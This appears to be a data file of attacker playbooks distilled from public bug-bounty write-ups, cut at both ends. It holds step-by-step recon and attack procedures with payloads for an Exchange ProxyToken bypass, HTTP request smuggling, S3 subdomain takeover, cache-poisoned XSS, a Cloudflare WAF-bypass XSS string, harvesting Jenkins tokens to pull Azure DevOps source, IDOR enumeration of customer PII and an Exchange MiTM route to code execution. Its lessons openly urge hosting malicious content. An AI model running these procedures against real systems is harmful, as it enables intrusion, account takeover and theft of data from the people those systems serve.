failure_indicators: Standard `400 Bad Request` or `422 Unprocessable Entity` responses without SQL errors, indicating input validation is working.
The `array_intersect` check successfully filters out malicious keys.
No observable change in response behavior despite crafted payloads.

playbooks.impact: Attacker can potentially read sensitive data from the database, modify data, or execute arbitrary SQL commands depending on the privileges of the database user and the nature of the injection.
playbooks.key_lesson: When dealing with custom Eloquent scopes (`scopeSearch`, `scopeSort`), always verify how the input parameters are sanitized and validated before being used in database queries, especially if they originate from user-controlled input passed through `Binput` or similar input handling libraries.

meta.title: ProxyToken: An Authentication Bypass in Microsoft Exchange Server

trigger_conditions.when_to_apply: When a Microsoft Exchange Server is accessible and not configured for special delegated authentication, allowing an unauthenticated attacker to bypass authentication for ECP endpoints.
prerequisites: Target must be a Microsoft Exchange Server.
The server should not be configured with special delegated authentication that would load the DelegatedAuthModule on the backend ECP site.
applicability_signals: Presence of the /ecp path in web access.
Web server responses indicate Microsoft Exchange.
HTTP 500 errors on /ecp endpoints accompanied by a valid 'ECP canary' value in the response body.
skip_if: Target requires any form of authentication before accessing /ecp endpoints.
WAF blocks requests to /ecp or specific headers/cookies.
All responses from /ecp are 200 OK or other non-500 codes without a canary.

recon_steps: Step 1: Identify Microsoft Exchange Server instances on the target network.
Step 2: Probe for the existence of the /ecp endpoint on the default web server (ports 80/443).
attack_steps: Step 1: Send a GET request to a target /ecp endpoint (e.g., /ecp/default.aspx) without any authentication credentials or session tokens.
Step 2: Observe the response. If an HTTP 500 error is returned, extract the 'ECP canary' value from the response body.
Step 3: Construct a new GET request to an /ecp endpoint, including the extracted 'ECP canary' value as a GET parameter. For example: GET /ecp/default.aspx?SecurityToken=<ECP_CANARY_VALUE>
Step 4: If the request returns a 200 OK status code, the attacker has bypassed authentication. Proceed to exploit by targeting mailbox configuration actions via /ecp endpoints.
payloads_or_patterns: GET <TARGET_URL>/ecp/default.aspx
GET <TARGET_URL>/ecp/default.aspx?SecurityToken=<ECP_CANARY_VALUE>
tools_recommended: Burp Suite or OWASP ZAP: To capture, modify, and send HTTP requests. Use the Repeater tab to extract the canary and resend the request.
Curl: For scripting automated reconnaissance and attack attempts.
success_indicators: HTTP 200 OK response to the crafted request containing the SecurityToken parameter.
Ability to access and perform configuration actions on mailboxes via the /ecp endpoint.
Successful implementation of email forwarding rules for arbitrary users.
failure_indicators: Consistent HTTP 500 errors without a valid 'ECP canary' in the response body.
401 Unauthorized or 403 Forbidden responses to the crafted request.
Responses indicating the 'ECP canary' is invalid or expired.
If requests consistently fail, the target might be patched or configured differently; consider other Exchange vulnerabilities.

playbooks.impact: An unauthenticated attacker can perform configuration actions on mailboxes belonging to arbitrary users, including setting up email forwarding to an attacker-controlled account. This allows for the exfiltration of sensitive emails.
playbooks.key_lesson: When interacting with web applications that proxy requests, pay close attention to how authentication is handled by both the front-end and back-end components, especially in complex enterprise software like Microsoft Exchange.

meta.title: I owe your Request | HTTP Request Smuggling leads to Full Accounts takeover

affected_components: Any web server processing HTTP requests
tech_stack_fingerprints: CT.TE identified as a potential indicator (Content-Length vs Transfer-Encoding preference between front-end and back-end servers)

trigger_conditions.when_to_apply: When a web application exhibits different handling of `Content-Length` and `Transfer-Encoding` headers between its front-end and back-end servers, indicating a potential for HTTP request smuggling.
prerequisites: The target application must use separate front-end and back-end servers or a proxy that handles HTTP requests differently.
The attacker must be able to send crafted HTTP requests to the target.
applicability_signals: A target responding to a request with `Content-Length` and `Transfer-Encoding` headers, where one header is processed by the front-end and the other by the back-end.
The presence of `CT.TE` in vulnerability scanning tools (like Burp extension) can be an initial indicator.
skip_if: All HTTP requests are processed identically by all servers/proxies in the chain.
The target WAF blocks requests containing conflicting `Content-Length` and `Transfer-Encoding` headers.

recon_steps: Step 1: Use tools like Burp Suite HTTP Request Smuggling extension or `smuggler.py` to probe subdomains and URLs for `CT.TE` or similar indicators.
Step 2: Manually analyze responses for variations in header processing, especially when sending requests with both `Content-Length` and `Transfer-Encoding` headers.
attack_steps: Step 1: Send a POST request with `Content-Length` and `Transfer-Encoding: chunked` to trigger a connection timeout or unexpected behavior on the back-end server, confirming the CL.TE vulnerability.
Step 2: Use Burp Suite's Turbo Intruder (or equivalent) to send a smuggled request that manipulates the subsequent request processed by the back-end.
Step 3: Craft a smuggled request to redirect a user to a malicious page (e.g., `/video` in the writeup) or exploit other vulnerabilities like Self XSS or Open Redirect if found.

Step 4: Escalate the vulnerability further, for instance, by using it to potentially take over accounts if sensitive information or sensitive actions can be accessed/performed through the smuggled request.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Transfer-Encoding: chunked
Transfer-Encoding: identity

1 A 0

POST / HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked
Transfer-Encoding: identity

0
GET /video HTTP/1.1
Foo: x
tools_recommended: Burp Suite (Community/Pro) with HTTP Request Smuggling extension
smuggler.py
Burp Suite Turbo Intruder
success_indicators: Connection timeout on the initial validation request, indicating the back-end processed `Transfer-Encoding`.
Successful smuggling of a request that results in an unexpected response (e.g., 'not found' page for `/video` when `/video` was not intended).
Observable account takeover or unauthorized data access as a result of escalating the smuggling vulnerability.
failure_indicators: No connection timeout or unusual behavior on the validation request, suggesting the `Transfer-Encoding` header is not being prioritized by the back-end.
Smuggled requests do not affect subsequent requests processed by the back-end, or are discarded.
WAF blocks the crafted smuggling requests.

playbooks.impact: Bypassing security controls, unauthorized access to sensitive data, direct compromise of other users' information, leading to full account takeover.
playbooks.key_lesson: Always test for HTTP request smuggling by probing for discrepancies in `Content-Length` and `Transfer-Encoding` header handling between front-end and back-end servers, as this can lead to critical vulnerabilities like account takeover.

meta.title: How MarkMonitor left >60,000 domains for the taking

affected_components: Domains configured with DNS records pointing to AWS S3 buckets that do not exist

trigger_conditions.when_to_apply: When a domain's DNS records (specifically A or CNAME records) point to an AWS S3 endpoint, and the corresponding S3 bucket has not been created. This is particularly applicable to parked domains or domains that have been improperly configured.
prerequisites: A domain name is registered and its DNS records are configured to point to an AWS S3 endpoint (e.g., an S3 bucket name as a CNAME or an S3 IP address).
applicability_signals: A domain resolves to an IP address known to be used by AWS S3 (e.g., 93.191.168.52).
Accessing the domain results in an S3-specific 404 error page, indicating a missing bucket.
skip_if: The domain resolves to an IP address not associated with S3.
Accessing the domain results in a different error page (e.g., a standard web server 404, or a domain parked page indicating active management).

recon_steps: Step 1: Identify domains registered through MarkMonitor that have DNS records pointing to AWS S3 IP addresses.
Step 2: For each identified domain, attempt to access it via HTTP/S. Observe the response for an S3 404 error indicating a missing bucket.
attack_steps: Step 1: If an S3 404 error is observed for a target domain, create an AWS S3 bucket with the exact name that the DNS record implies (e.g., if the CNAME is 'testing.example.com', create an S3 bucket named 'testing.example.com').
Step 2: Upload malicious content (e.g., an HTML file with JavaScript) to the newly created S3 bucket.
Step 3: Configure the S3 bucket for static website hosting if necessary.
Step 4: Access the target domain again to verify that the uploaded content is being served.
payloads_or_patterns: Owned by
Use curl to check for S3 404: curl -I <TARGET_URL>
tools_recommended: Sublist3r or Amass for subdomain enumeration.
MassDNS for rapid DNS lookups.
AWS CLI for S3 bucket creation and management.
Burp Suite or similar for observing HTTP responses.
success_indicators: The attacker's uploaded content (e.g., custom HTML or JavaScript) is served when accessing the target domain.
Observing a response with the attacker's payload content, rather than an S3 404 or a parked page.
failure_indicators: The domain continues to serve a parked page or a different error, even after attempting to claim the S3 bucket. This may indicate the bucket name was incorrect, or the DNS records were updated by the legitimate owner.

Receiving a 'BucketAlreadyOwnedByYou' error when trying to create the bucket, indicating another party has already claimed it. Pivot by trying to leverage the existing content or contacting the owner if possible.

playbooks.impact: An attacker can serve arbitrary content from a vulnerable subdomain, leading to Cross-Site Scripting (XSS) attacks, phishing pages, or potentially facilitating Man-in-the-Middle (MitM) attacks by allowing the attacker to obtain TLS certificates for the domain.
playbooks.key_lesson: When a DNS record points to an AWS S3 endpoint and results in a 404 error for a non-existent bucket, attempt to claim the bucket with your own AWS account and host malicious content.

meta.title: Cache Poisoning via SelfXSS + Path Parameter

trigger_conditions.when_to_apply: When a JSP application exposes an endpoint that returns the visitor's IP address and is vulnerable to cache poisoning, specifically when it processes path parameters in a way that can be exploited with a Self-XSS payload.
prerequisites: The target must be a JSP application.
There must be a file like common.jsp that returns the IP of the visitor.
The application must be vulnerable to cache poisoning.
The application must process path parameters in the URL.
The application must be vulnerable to Self-XSS through the IP disclosure.
applicability_signals: Existence of common.jsp or similar file that reveals visitor IP.
Ability to control the visitor's IP via headers like X-Forwarded-For.
URL structure allows for path parameters (e.g., /folder/file.jsp;param)
Caching mechanism exists that respects file extensions like .css.
skip_if: The application does not reveal visitor IP.
The application does not allow manipulation of the IP via headers.
The application does not support path parameters in URLs.
The caching mechanism does not respect file extensions for cache keys.
A WAF blocks XSS payloads in headers.

recon_steps: Step 1: Identify JSP files in the target application using web archive or directory bruteforcing.
Step 2: Test identified JSP files (e.g., common.jsp) to see if they return the visitor's IP address.
Step 3: Attempt to control the returned IP address by manipulating headers like 'X-Forwarded-For' and 'X-Real-IP'.
Step 4: Analyze URL structures for potential path parameter syntax (e.g., /path/to/resource;parameter.extension).
Step 5: Test if appending a file extension like '.css' to a path parameter influences caching behavior.
attack_steps: Step 1: Craft a request to the vulnerable JSP file, including the XSS payload in the 'X-Forwarded-For' header and a malicious path parameter ending with a common cacheable extension like '.css'. Example: GET /folder/common.jsp;<svg/onload=alert(document.domain)>.css HTTP/1.1 Host: <TARGET_URL> X-Forwarded-For: <svg/onload=alert(document.domain)>
Step 2: Observe the response. If the backend returns the page content with the XSS payload, it indicates the payload is being processed.
Step 3: If a proxy or CDN is in place, it might cache the response based on the URL including the '.css' extension.
Step 4: Subsequent requests to the cached URL (without the malicious header) will serve the poisoned cache, executing the XSS payload in the victim's browser.
payloads_or_patterns:
GET /<path>/common.jsp;<PAYLOAD>.css HTTP/1.1
Host: <TARGET_URL>
X-Forwarded-For: <PAYLOAD>
<svg/onload=alert(document.domain)>
<script>alert(document.domain)</script>
xss=<script>alert(document.domain)</script>
tools_recommended: Burp Suite: To intercept and modify requests, especially headers and URL parameters.
Wayback Machine: For historical analysis and discovery of vulnerable files.
Dirb/Gobuster: For discovering JSP files and directory structures.
Curl: For crafting and sending specific HTTP requests.
success_indicators: The response from the target server contains the XSS payload embedded within the JSP output.
A subsequent request to the URL (e.g., /folder/common.jsp;.css) served by the cache executes the injected XSS payload in the browser (e.g., an alert box pops up with the domain).
HTTP cache headers (e.g., Cache-Control, Expires) on the poisoned URL indicate caching.
failure_indicators: The XSS payload is not reflected in the response, even with the correct headers and path parameter.
The server returns a 400 Bad Request or similar error for the crafted URL.
The caching mechanism does not consider the '.css' extension or the path parameter in the cache key.
The WAF blocks the request containing the XSS payload in the header or URL.

playbooks.impact: Victims who visit the poisoned cache URL will have the XSS payload executed in their browser. This can lead to session hijacking, credential theft, defacement, or further exploitation depending on the XSS payload.
playbooks.key_lesson: Leverage Self-XSS vulnerabilities in conjunction with web caching mechanisms by manipulating path parameters and file extensions to achieve stored XSS effects.

meta.title: Exploiting Devops -Leak Source codes

tech_stack_fingerprints: Jenkins service running on port 8080 (observed via Shodan)

trigger_conditions.when_to_apply: When an organization uses Jenkins for CI/CD and has publicly accessible Jenkins instances with unauthenticated access to pipeline logs.
prerequisites: Discovery of a Jenkins instance used by the target organization.
The Jenkins instance must have accessible pipeline logs without authentication.
applicability_signals: Shodan search results showing Jenkins instances for the target's ASN.
Jenkins instances responding on common ports like 8080.
Accessible `pipeline.log` files within Jenkins workspaces.
skip_if: Jenkins instances require authentication for accessing pipeline logs.
No Jenkins instances are found for the target organization's ASN.

recon_steps: Step 1: Obtain the ASN (Autonomous System Number) for the target organization.
Step 2: Use Shodan to search for services associated with the target's ASN, filtering by common Jenkins ports (e.g., 8080).
Step 3: Identify Jenkins instances from Shodan results that appear to be associated with the target.
Step 4: Access the identified Jenkins instances and navigate through projects and workspaces to find accessible `pipeline.log` files.
attack_steps: Step 1: Browse the Jenkins workspace and locate the `pipeline.log` file for projects.
Step 2: Analyze the `pipeline.log` file for sensitive information such as Windows local directory paths, computer names, usernames, and Azure directory information.
Step 3: Look for specific user build histories within Jenkins, focusing on the latest builds for potentially active tokens or API keys.
Step 4: Examine the 'Console Output' or 'Bash History' within the build history for executed curl requests that may contain tokens or API keys.
Step 5: If a token is found, research its context (e.g., Azure Active Directory tokens, VSTS tokens) using online resources like Google.
Step 6: Investigate 'Pipeline Steps' for additional occurrences of the token or related information.
Step 7: If a token with sufficient privileges is identified (e.g., PAT for Azure DevOps), use it to interact with the Azure DevOps API to download source code.
payloads_or_patterns: `curl --user validuser:<TOKEN> -X POST --url https://dev.azure.com/<ORG>/<PROJECT>_child/_apis/build/builds?api-version=5.0 --data '{"definition":{"id": 65}, "parameters": "{\"xtyf\":\"285\"}"}' --header Content-Type: application/json` (Example from writeup, token and IDs will vary)
Patterns like `windows local directory`, `computer name`, `user name` within `pipeline.log`
Patterns like `VSTS.exe` or Azure DevOps API endpoint URLs
tools_recommended: Shodan: For initial reconnaissance of exposed services.
Burp Suite: To intercept and analyze HTTP requests and responses, especially when interacting with APIs.
Google: For researching discovered tokens and API contexts.
success_indicators: Discovery of sensitive information (filenames, paths, usernames) within `pipeline.log`.
Identification of authentication tokens or API keys in build console output or pipeline steps.
Successful authentication and download of source code from Azure DevOps using a discovered token.
failure_indicators: Jenkins instances are inaccessible or require authentication.
`pipeline.log` files do not contain any sensitive information or tokens.
Discovered tokens are invalid or lack sufficient permissions to access source code.

playbooks.impact: Unauthorized access to sensitive source code, exposure of hardcoded credentials within the source code, potential for further exploitation by understanding application logic and internal infrastructure.
playbooks.key_lesson: Always scan for publicly accessible Jenkins instances and inspect `pipeline.log` files for hardcoded credentials or tokens, as they often contain valuable reconnaissance information for further exploitation.

meta.title: ChaosDB: Unauthorized Privileged Access to Microsoft Azure Cosmos DB

affected_components: Jupyter Notebook feature in Cosmos DB

trigger_conditions.when_to_apply: This vulnerability is applicable when the Jupyter Notebook feature is enabled within a Microsoft Azure Cosmos DB instance, as it allows for unauthorized privileged access to other customers' Cosmos DB instances.
prerequisites: Target uses Microsoft Azure Cosmos DB.
The Jupyter Notebook feature is enabled on the target Cosmos DB instance.
applicability_signals: The presence of the Jupyter Notebook feature in Cosmos DB.
skip_if: The Jupyter Notebook feature is not enabled on the Cosmos DB instance.
Cosmos DB accounts with vNET or firewall enabled might have additional security mechanisms preventing risk of unauthorized access.

recon_steps: Identify Azure Cosmos DB instances that have the Jupyter Notebook feature enabled.
attack_steps: Step 1: Exploit a chain of vulnerabilities in the Jupyter Notebook feature of Cosmos DB to query information about the target Cosmos DB Jupyter Notebook.
Step 2: Obtain a set of credentials related to the target Cosmos DB account, the Jupyter Notebook compute, and the Jupyter Notebook Storage account, including the Primary Key.
Step 3: Use the obtained credentials to view, modify, and delete data in the target Cosmos DB account via multiple channels.
payloads_or_patterns: Insufficient detail in writeup
tools_recommended: Insufficient detail in writeup
success_indicators: Unauthorized access (read, write, delete) to another customer's Cosmos DB instances.
Obtaining the Primary Key of the target Cosmos DB account.
failure_indicators: Inability to query information about the target Cosmos DB Jupyter Notebook.
Failure to obtain any credentials.

playbooks.impact: Allows any Azure user full admin access (read, write, delete) to another customer's Cosmos DB instances without authorization, leading to potential data exfiltration, modification, or deletion.
playbooks.key_lesson: Investigate vulnerabilities within managed cloud service features, such as Jupyter Notebooks in Cosmos DB, as they can lead to broad unauthorized access to sensitive data.

meta.title: Oauth client secret leak and possible IDOR leading to PII Disclosure

trigger_conditions.when_to_apply: When a SaaS platform uses OAuth and publicly exposes environment variables or API endpoints that are susceptible to IDOR with user or organization identifiers.
prerequisites: Discovery of a JavaScript file on an OAuth login page containing environment variables.
applicability_signals: Presence of a JavaScript file on oauth login pages.
Subdomain api.example.com identified.
Existence of API endpoints returning site-specific ID values.
skip_if: No observable environment variables in JS files.
API endpoints do not return site-specific ID values.
API calls with identified IDs result in strict authorization errors for any authenticated user.

recon_steps: Step 1: Inspect HTML source of OAuth login pages (e.g., oauth.example.com) for JavaScript files that might contain environment variables.
Step 2: Analyze identified JavaScript files for sensitive information like API endpoints or OAuth client secrets.
Step 3: Use tools like Gau to scan identified subdomains (e.g., api.example.com) for interesting endpoints.
Step 4: Identify API endpoints that return site-specific ID values (e.g., user IDs, organization IDs).
attack_steps: Step 1: Craft a POST request to generate an access token based on information found in JS files (if applicable).
Step 2: Use Burp Suite Intruder or a similar tool to enumerate the identified ID values against the discovered API endpoints, using the generated access token.
Step 3: Test endpoints like '/widgets' with enumerated IDs to see if a full list of users for an organization is returned.
Step 4: Analyze responses from the '/me' endpoint to understand user hierarchy or permissions.
payloads_or_patterns: Access token generation payload (details from JS file)
GET /widgets?organization_id=<ENUMERATED_ID>
GET /users/<ENUMERATED_ID>
GET /me
tools_recommended: Burp Suite (for proxying, intruder, and request crafting)
Gau (for subdomain and endpoint discovery)
curl (for manual request testing)
success_indicators: API responses containing PII of other customers (Full Names, Usernames, Email Addresses, Phone Numbers, Employee IDs, Job Titles, Login Timestamps).
A widgets endpoint returning a full list of users for a given organization.
Response from '/me' endpoint indicating successful retrieval of user data (even if with a hierarchy message).
failure_indicators: 401 Unauthorized or 403 Forbidden responses for all enumerated IDs, indicating strong authorization checks.
No sensitive information returned in API responses.
JavaScript files do not contain exploitable environment variables.

playbooks.impact: Disclosure of Personally Identifiable Information (PII) of customers, including full names, usernames, email addresses, phone numbers, employee IDs, job titles, and login timestamps. This could lead to targeted phishing attacks, identity theft, or further unauthorized access.
playbooks.key_lesson: When analyzing OAuth flows or associated JavaScript files, always look for leaked API endpoints or credentials that could be used for further enumeration and exploitation, especially against endpoints returning user-specific data.

meta.title: Reflective XSS via search box [Bypassing Cloudflare WAF]

trigger_conditions.when_to_apply: When a web application has a search functionality that is vulnerable to HTML injection and is protected by Cloudflare WAF.
prerequisites: The target website uses Cloudflare WAF.
The search functionality is present and accessible to unauthenticated users.
applicability_signals: The search input accepts HTML tags without proper sanitization.
Cloudflare WAF blocks common XSS payloads.
Certain special characters (e.g., '&', '#') are handled in a specific, exploitable way by the WAF or the application's input processing.
skip_if: Search input is strictly sanitized and does not allow any HTML injection.
WAF blocks all attempts to inject special characters or bypass techniques.
The application does not reflect user input from the search box in the response.

recon_steps: Step 1: Identify the search box functionality on the target website (e.g., REDACTED.COM/).
Step 2: Attempt basic HTML injection payloads (e.g., `test`, `test`) in the search box to confirm HTML injection vulnerability.
Step 3: Test common XSS payloads (e.g., `<script>alert(1)</script>`) to check for WAF protection. Observe WAF responses (e.g., 403 Forbidden, Cloudflare challenge page).
attack_steps: Step 1: Identify characters that are filtered, removed, or treated unusually by the WAF or the application's input processing (e.g., '&' becomes '&=undefined', '#' removes subsequent characters).
Step 2: Craft a payload that leverages these unusual character handling behaviors to bypass WAF filtering. Start with a simple structure like `'><svg onmouseover='...'/>`.
Step 3: URL-encode the crafted payload to prevent premature filtering and to ensure proper rendering on the client-side.

Step 4: Experiment with different encodings or character substitutions (like HTML entities or 7-bit ASCII representations for characters like parentheses) in combination with the problematic characters ('&', '#') to achieve reliable execution.

Step 5: Construct the final payload using URL encoding and bypass characters, e.g., `%22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain)`. The specific structure `confirm&#0000000040document.domain` is a key technique shown.
payloads_or_patterns: %22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain)
tools_recommended: Browser Developer Tools: To inspect request and response payloads, and observe JavaScript execution.
Burp Suite or OWASP ZAP: To intercept and modify requests, analyze WAF behavior, and perform automated payload testing.
Online URL Encoder/Decoder: For precise encoding and decoding of payloads.
success_indicators: Execution of JavaScript code, such as an `alert()` box displaying `document.domain`.
The WAF does not trigger a block or challenge page upon submission of the crafted payload.
failure_indicators: WAF blocks the request (e.g., 403 Forbidden, Cloudflare block page). Suggestion: Try different bypass characters or encoding techniques.
The payload is not reflected or executed, and no alert box appears. Suggestion: Analyze how the input is processed and rendered, and adjust the payload accordingly.
The special characters used for bypass are sanitized or removed by the application before rendering. Suggestion: Experiment with different combinations or alternative bypass methods.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser, allowing for session hijacking, data theft, credential phishing, or further attacks on the user.
playbooks.key_lesson: When encountering WAF-protected search functionalities, analyze the behavior of special characters and their URL-encoded/HTML-encoded representations, as these can reveal bypass vectors.

meta.title: Pwn2Own Vancouver 2021 :: Microsoft Exchange Server Remote Code Execution

trigger_conditions.when_to_apply: When an attacker can perform a Man-in-the-Middle (MiTM) attack on the network traffic of a victim machine running Microsoft Exchange Server.
prerequisites: Attacker must be in a privileged network position to intercept and modify network traffic (MiTM).
applicability_signals: The `Update-ExchangeHelp` or `Update-ExchangeHelp -Force` command is executed by an administrative user on the Exchange Server.
The `ManifestUrl` registry key for `SOFTWARE\Microsoft\ExchangeServer\v15\UpdateExchangeHelp` does not exist or points to a controllable URL.
skip_if: No MiTM capability.
The `ManifestUrl` is hardcoded to a trusted, immutable URL and cannot be influenced.

recon_steps: Step 1: Identify Microsoft Exchange Server instances within the target network.
Step 2: Analyze network traffic to identify instances where administrative users might execute `Update-ExchangeHelp` or `Update-ExchangeHelp -Force`.
Step 3: Check the registry key `HKLM\SOFTWARE\Microsoft\ExchangeServer\v15\UpdateExchangeHelp\ManifestUrl` on the target server to see if it's set. If not set, it defaults to a Microsoft URL.
attack_steps: Step 1: Position the attacker in a MiTM position to intercept traffic destined for the Exchange Server.
Step 2: Wait for an administrative user to execute the `Update-ExchangeHelp` or `Update-ExchangeHelp -Force` command.
Step 3: During the command execution, intercept the request for the `ManifestUrl` (which defaults to `http://go.microsoft.com/fwlink/p/?LinkId=287244` if not specified in the registry).
Step 4: Modify the `ManifestUrl` to a URL controlled by the attacker, pointing to a malicious manifest file. The `AsyncDownloadFile` method uses `WebClient.DownloadFileAsync`.
Step 5: The Exchange Server will download the attacker-controlled manifest file.

Step 6: Analyze the structure of the manifest file and the subsequent download operations performed by Exchange Server based on this manifest. The vulnerability lies in how the downloaded files are processed, potentially leading to RCE.

Step 7: The writeup doesn't fully detail the RCE payload, but it implies that by controlling the manifest and subsequent downloads, an attacker can achieve RCE. Further analysis of `HelpDownloader.SearchManifestForApplicableUpdates` and related download logic would be required for the full exploit chain.
payloads_or_patterns: Modify DNS or ARP to perform MiTM.
Craft a malicious manifest file (`.xml` or similar) to be served from an attacker-controlled web server.
The exact RCE payload depends on the subsequent download and execution steps, which are not fully detailed in the writeup.
tools_recommended: Burp Suite or OWASP ZAP: For intercepting and modifying HTTP requests.
Wireshark: For network traffic analysis.
A web server (e.g., Python's SimpleHTTPServer, Nginx) to host the attacker-controlled manifest file.
success_indicators: Receiving the attacker-controlled manifest file on the target server (can be detected by a callback or by analyzing server-side logs if available).
Observing anomalous behavior on the Exchange Server, indicating code execution (e.g., unexpected processes, network connections, file creation).
failure_indicators: No MiTM traffic observed, or traffic not being intercepted correctly.
Exchange Server continues to download from the legitimate Microsoft URL.
Malicious manifest file is downloaded but does not trigger any observable malicious behavior (indicates the RCE vector might be more complex or patched).

playbooks.impact: Remote Code Execution (RCE) on Microsoft Exchange Server, allowing an attacker to gain full control of the compromised server, access sensitive data, and potentially pivot to other systems within the network.
playbooks.key_lesson: When an application downloads configuration or update files from a URL that can be influenced by a MiTM attacker, scrutinize the deserialization or processing of these downloaded files for code execution vulnerabilities.

meta.title: Business Logic Ratings Bug

tech_stack_fingerprints: Backend request sends an integer for rating

trigger_conditions.when_to_apply: When a web application allows users to submit ratings on a scale (e.g., 1-5 stars) and the rating input is not sufficiently validated on the backend.
prerequisites: User must be able to submit a rating.
Application must have a backend endpoint for rating submission.
applicability_signals: UI displays a star rating system (e.g., 1-5 stars).
Proxying requests shows an integer parameter for the rating.

recon_steps: Step 1: Identify the endpoint and parameter used for submitting user ratings by proxying requests with Burp Suite.
Step 2: Observe the expected range of values for the rating parameter (e.g., integers between 1 and 5).
attack_steps: Step 1: Submit a rating request with a value outside the expected range (e.g., -5000, -500, 500).
Step 2: Observe the HTTP response status code and body for unexpected errors or processing.
Step 3: If a 500 error occurs, try incrementally smaller/larger negative or positive numbers until a non-500 response is received.
payloads_or_patterns: rating=<OUT_OF_RANGE_INTEGER>
tools_recommended: Burp Suite: Intercept and modify HTTP requests for the rating parameter.
success_indicators: The rating is accepted and processed by the backend, even if it's outside the expected 1-5 range.
The average rating for a location is significantly skewed (positively or negatively) after injecting an out-of-range rating.
failure_indicators: The server returns a 4xx or 5xx error for all out-of-range ratings, indicating robust backend validation.
The injected rating is ignored or reset to a default value without error.

playbooks.impact: Allows an attacker to drastically skew the average rating of a location, influencing user decisions and potentially harming competitors or artificially inflating their own business's reputation. This undermines the integrity of the rating system and user trust.
playbooks.key_lesson: Always validate input parameters on the backend, especially numerical ranges, even if client-side validation exists. Test for out-of-bounds values, including very large positive and negative numbers.

meta.title: Retrieve Archived Stories Of Any Public Instagram Account.

trigger_conditions.when_to_apply: When an authenticated user can make requests to the `/api/v1/ads/graphql` endpoint and the `id` parameter within the `query_params` JSON object is used to retrieve archived stories.

The `query_params` field in the request body accepts a JSON object.
The `id` parameter is present within the `query_params` JSON and appears to be a user identifier.

The `id` parameter is not found or is not a user identifier.

recon_steps: Send a request to `/api/v1/ads/graphql` with typical parameters to observe the response structure and identify the `query_params` field and its contents.
Analyze the response to confirm the presence of an `id` parameter within the `query_params` JSON, and verify if it represents a user ID.
